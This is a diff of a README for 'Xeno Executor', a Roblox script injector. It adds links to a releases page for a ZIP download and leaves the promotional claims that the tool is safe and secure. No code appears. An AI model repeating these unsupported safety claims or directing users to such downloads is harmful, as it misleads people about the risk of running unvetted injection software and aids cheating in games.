@@ -5,8 +5,8 @@
 > A safe, reliable, and lightning-fast script executor for Roblox. 🛠️
 ---
 ---
-<<img,header>>![header](https://github.com/user-attachments/assets/797d59e6-c7f6-4459-8976-b974a03edddd)
-
+![header](https://github.com/user-attachments/assets/797d59e6-c7f6-4459-8976-b974a03edddd)
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](../../releases)
 ---
 ---
 ## 🌟 Why Choose Xeno Executor?
@@ -27,7 +27,7 @@ Xeno Executor is crafted for Roblox enthusiasts who want to enhance their gamepl
 🌍 Universal Compatibility: Works across all Roblox games and platforms.
 ## 📥 How to Download and Use
 
-1. Click the “Download” button above to get the ZIP file.
+1. Click the “[Download](../../releases)” button above to get the ZIP file.
 2. Extract the files to a secure folder on your PC.
 3. Open Xeno Executor and follow the on-screen setup guide.
 4. Load your favorite script, inject, and enjoy a next-level Roblox experience! 🎉
@@ -53,10 +53,8 @@ Your security is our top priority!
 ### 🌌 Screenshots
 ![xeno1](https://github.com/user-attachments/assets/acdccd73-28ae-4876-9957-b964e1b4908b)
 
-<<img,xeno1>>![xeno22](https://github.com/user-attachments/assets/fca105b2-926b-4137-9d39-887103b3bdb9)
+![xeno22](https://github.com/user-attachments/assets/fca105b2-926b-4137-9d39-887103b3bdb9)
 
-
-<<img,xeno22>>
 ### 🎉 Get Started Today!
 ⭐ Don’t forget to star the project on GitHub to show your support!
 🔥 Download Xeno Executor now and take your Roblox gameplay to the next level!
